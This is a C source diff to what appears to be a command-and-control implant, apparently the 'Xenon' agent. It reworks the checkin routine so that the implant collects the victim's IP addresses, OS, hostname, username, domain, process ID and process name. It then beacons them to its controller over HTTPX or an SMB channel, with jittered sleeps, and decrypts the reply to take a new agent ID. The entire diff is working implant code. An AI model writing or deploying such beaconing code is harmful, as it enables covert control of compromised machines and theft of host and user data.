@@ -2,6 +2,8 @@
 #include "Checkin.h"
 #include "Task.h"
 
+#include "TransportSmb.h"
+
 #include <lm.h>
 #include <lmwksta.h>
 #include <iphlpapi.h>
@@ -149,7 +151,7 @@ char *CheckinGetCurrentProcName()
     return processName;
 }
 
-BOOL CheckinSend(PPARSER output)
+BOOL CheckinSend()
 {
     /*
     Format of checkin package:
@@ -174,51 +176,87 @@ BOOL CheckinSend(PPARSER output)
         Extern IP
     */
 
-    BOOL bStatus        = FALSE;
     UINT32 numberOfIPs  = 0;
     // uuid + action
-    PPackage checkinData = NULL;
-    
-    checkinData = PackageInit(CHECKIN, TRUE);
+    PPackage CheckinData = NULL;    
+    CheckinData = PackageInit(CHECKIN, TRUE);
 
     // UUID
-    PackageAddString(checkinData, (PCHAR)xenonConfig->agentID, FALSE);
+    PackageAddString(CheckinData, (PCHAR)xenonConfig->agentID, FALSE);
 
     // IP addresses;
     UINT32 *tableOfIPs = CheckinGetIPAddress(&numberOfIPs);
-    PackageAddInt32(checkinData, numberOfIPs);
+    PackageAddInt32(CheckinData, numberOfIPs);
     for (UINT32 i = 0; i < numberOfIPs; i++)
-        PackageAddInt32(checkinData, tableOfIPs[i]);
+        PackageAddInt32(CheckinData, tableOfIPs[i]);
 
     // OS
-    PackageAddString(checkinData, CheckinGetOsName(), TRUE);
+    PackageAddString(CheckinData, CheckinGetOsName(), TRUE);
     // Arch
-    PackageAddByte(checkinData, CheckinGetArch());
+    PackageAddByte(CheckinData, CheckinGetArch());
     // Hostname
-    PackageAddString(checkinData, CheckinGetHostname(), TRUE);
+    PackageAddString(CheckinData, CheckinGetHostname(), TRUE);
     // Username
-    PackageAddString(checkinData, CheckinGetUserName(), TRUE);
+    PackageAddString(CheckinData, CheckinGetUserName(), TRUE);
     // Domain
-    PackageAddWString(checkinData, CheckinGetDomain(), TRUE);
+    PackageAddWString(CheckinData, CheckinGetDomain(), TRUE);
     // PID
-    PackageAddInt32(checkinData, GetCurrentProcessId());
+    PackageAddInt32(CheckinData, GetCurrentProcessId());
     // ProcessName
-    PackageAddString(checkinData, CheckinGetCurrentProcName(), TRUE);
+    PackageAddString(CheckinData, CheckinGetCurrentProcName(), TRUE);
     // External IP 
-    PackageAddString(checkinData, (PCHAR) "1.1.1.1", TRUE);    // TODO
+    PackageAddString(CheckinData, (PCHAR) "1.1.1.1", TRUE);    // TODO
 
 
-    bStatus = PackageSend(checkinData, output);      // Send the request, fill the parser output
-    if (!bStatus || !output)
+    /* Send checkin package and wait for success */
+
+    PARSER Output = { 0 };
+
+#ifdef HTTPX_TRANSPORT
+
+    PackageSend(CheckinData, &Output);
+
+#endif
+
+#ifdef SMB_TRANSPORT
+
+    PBYTE  pOutData  = NULL;
+    SIZE_T OutLen    = 0;
+    SIZE_T sizeUuid  = TASK_UUID_SIZE;
+
+    PackageSend(CheckinData, NULL);
+
+    _dbg("[SMB] Waiting for checkin response...");
+
+    // Sloppy 
+    while ( pOutData == NULL || OutLen == 0 )
     {
-        _err("Failed to send package");
-        goto cleanup;
+
+        SleepWithJitter(xenonConfig->sleeptime, xenonConfig->jitter);
+
+        SmbRecieve(&pOutData, &OutLen);
+
     }
 
-    bStatus = TRUE;
+    ParserNew(&Output, pOutData, OutLen);
 
-cleanup:
-    PackageDestroy(checkinData);
+    ParserDecrypt(&Output);
 
-    return bStatus;
+#endif
+
+
+    /* Set new agent UUID from checkin response */
+    if ( !TaskCheckin(&Output) )
+    {
+        ParserDestroy(&Output);
+        PackageDestroy(CheckinData);
+        return FALSE;
+    }
+
+
+    /* Clean Up */
+    ParserDestroy(&Output);
+    PackageDestroy(CheckinData);
+
+    return TRUE;
 }
